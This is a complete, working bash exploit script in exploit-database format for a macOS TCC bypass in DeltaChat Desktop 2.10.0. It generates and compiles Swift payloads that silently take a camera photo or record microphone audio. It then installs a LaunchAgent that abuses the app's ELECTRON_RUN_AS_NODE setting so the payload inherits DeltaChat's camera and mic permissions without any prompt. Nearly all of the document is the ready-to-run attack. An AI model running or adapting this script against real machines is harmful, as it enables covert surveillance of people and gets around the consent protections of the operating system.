#!/bin/bash

# Exploit Title: DeltaChat Desktop 2.10.0 - macOS TCC Bypass via RunAsNode fuse (camera & microphone access)
# Type: Local Privilege Escalation 
# Date: 2025-08-18
#
# Exploit Author: Kun Peeks
# Github: https://github.com/SwayZGl1tZyyy
#
# Vendor Homepage: https://delta.chat
# Software Link: https://github.com/deltachat/deltachat-desktop/releases/download/v2.10.0/DeltaChat-2.10.0-universal.dmg
# Version: v2.10.0
# Tested on: macOS Ventura
#
# Description:
# DeltaChat Desktop on macOS is vulnerable to a TCC (Transparency, Consent, and Control) bypass via misconfigured Electron Node fuses.
# By enabling the ELECTRON_RUN_AS_NODE environment variable, local attackers can execute arbitrary Swift payloads inside DeltaChat's Node.js context,
# inheriting full camera and microphone access without triggering any user prompt.
# This allows silent surveillance (photo/audio) even when Terminal has no TCC permissions.
#
# Requirements:
# - DeltaChat Desktop installed in /Applications
# - DeltaChat has been granted Camera and/or Microphone access
# - Terminal does NOT have Camera/Mic access (to prove the bypass)
#
# Usage:
# chmod +x deltachat_tcc_bypass.sh
# ./deltachat_tcc_bypass.sh
# Choose '1' for camera (take selfie) or '2' for microphone (record 5 sec)
#
# Output:
# - /tmp/selfie.jpg      (photo)
# - /tmp/recording.m4a   (audio)
#
# Exploit works without root privileges or additional tools.


set -e

USERNAME=$(whoami)
PLIST_PATH="/Users/$USERNAME/Library/LaunchAgents/com.deltachat.tcc.bypass.plist"
SWIFT_PATH="/tmp/tcc_payload.swift"
BIN_PATH="/Users/$USERNAME/Desktop/tcc_payload"

# Prompt user
echo "[*] Choose the TCC resource to access:"
echo "    1. Camera (take selfie)"
echo "    2. Microphone (record 5 sec)"
read -p "[?] Enter choice (1 or 2): " choice

# Validate
if [[ "$choice" != "1" && "$choice" != "2" ]]; then
    echo "[-] Invalid choice."
    exit 1
fi

# Write Swift payload
echo "[*] Generating Swift payload..."

if [[ "$choice" == "1" ]]; then
    echo "[*] Mode: Camera (selfie)"
    cat <<EOF > "$SWIFT_PATH"
import Foundation
import AVFoundation
import AppKit
import CoreImage

class SelfieTaker: NSObject, AVCaptureVideoDataOutputSampleBufferDelegate {
    var session: AVCaptureSession?
    var queue: DispatchQueue?

    override init() {
        super.init()
        session = AVCaptureSession()
        queue = DispatchQueue.main

        do {
            guard let device = AVCaptureDevice.default(for: .video) else {
                print("[-] No camera found")
                return
            }
            let input = try AVCaptureDeviceInput(device: device)
            if session!.canAddInput(input) {
                session!.addInput(input)
            }

            let output = AVCaptureVideoDataOutput()
            output.setSampleBufferDelegate(self, queue: queue)
            if session!.canAddOutput(output) {
                session!.addOutput(output)
            }

            queue?.async {
                self.session!.startRunning()
            }
        } catch {
            print("[-] Error: \\(error)")
        }
    }

    func captureOutput(_ output: AVCaptureOutput, didOutput sampleBuffer: CMSampleBuffer, from connection: AVCaptureConnection) {
        if let frame = CMSampleBufferGetImageBuffer(sampleBuffer) {
            let ciImage = CIImage(cvImageBuffer: frame)
            let context = CIContext()
            if let cgImage = context.createCGImage(ciImage, from: ciImage.extent) {
                let nsImage = NSImage(cgImage: cgImage, size: NSSize.zero)
                let bitmapRep = NSBitmapImageRep(data: nsImage.tiffRepresentation!)!
                let jpgData = bitmapRep.representation(using: .jpeg, properties: [:])!
                try? jpgData.write(to: URL(fileURLWithPath: "/tmp/selfie.jpg"))
                print("[+] Selfie saved at /tmp/selfie.jpg")
            }
        }
    }

    func stop() {
        session?.stopRunning()
    }
}

let taker = SelfieTaker()
DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
    taker.stop()
    exit(0)
}
RunLoop.main.run()
EOF

else
    echo "[*] Mode: Microphone (5 sec recording)"
    cat <<EOF > "$SWIFT_PATH"
import Foundation
import AVFoundation

class AudioRecorder: NSObject, AVAudioRecorderDelegate {
    var recorder: AVAudioRecorder!

    override init() {
        super.init()

        let settings = [
            AVFormatIDKey: Int(kAudioFormatMPEG4AAC),
            AVSampleRateKey: 44100,
            AVNumberOfChannelsKey: 1,
            AVEncoderAudioQualityKey: AVAudioQuality.high.rawValue
        ]

        let url = URL(fileURLWithPath: "/tmp/recording.m4a")

        do {
            recorder = try AVAudioRecorder(url: url, settings: settings)
            recorder.delegate = self
            recorder.record()

            print("[*] Recording started...")
            Timer.scheduledTimer(withTimeInterval: 5.0, repeats: false) { _ in
                self.recorder.stop()
                print("[+] Audio saved at /tmp/recording.m4a")
                exit(0)
            }
            RunLoop.main.run()
        } catch {
            print("[-] Error setting up recorder: \\(error)")
        }
    }
}

let r = AudioRecorder()
EOF

fi

# Compile
echo "[*] Compiling Swift payload to $BIN_PATH"
swiftc "$SWIFT_PATH" -o "$BIN_PATH"
chmod +x "$BIN_PATH"

# Create LaunchAgent
echo "[*] Writing LaunchAgent to $PLIST_PATH"

mkdir -p "/Users/$USERNAME/Library/LaunchAgents"

cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.deltachat.tcc.bypass</string>
  <key>ProgramArguments</key>
  <array>
    <string>/Applications/DeltaChat.app/Contents/MacOS/DeltaChat</string>
    <string>-e</string>
    <string>require('child_process').exec('$BIN_PATH')</string>
  </array>
  <key>EnvironmentVariables</key>
  <dict>
    <key>ELECTRON_RUN_AS_NODE</key>
    <string>true</string>
  </dict>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
EOF

# Load agent
echo "[*] Triggering DeltaChat exploit via launchctl..."
launchctl unload "$PLIST_PATH" 2>/dev/null || true
launchctl load "$PLIST_PATH"

echo "[*] Waiting for payload to complete..."
sleep 6

# Output
if [[ "$choice" == "1" ]]; then
    if [ -f "/tmp/selfie.jpg" ]; then
        echo "[+] Selfie taken! Opening..."
        open /tmp/selfie.jpg
    else
        echo "[-] No selfie found. Did DeltaChat have camera access?"
    fi
else
    if [ -f "/tmp/recording.m4a" ]; then
        echo "[+] Audio recording complete! Playing..."
        afplay /tmp/recording.m4a
    else
        echo "[-] No audio found. Did DeltaChat have mic access?"
    fi
fi
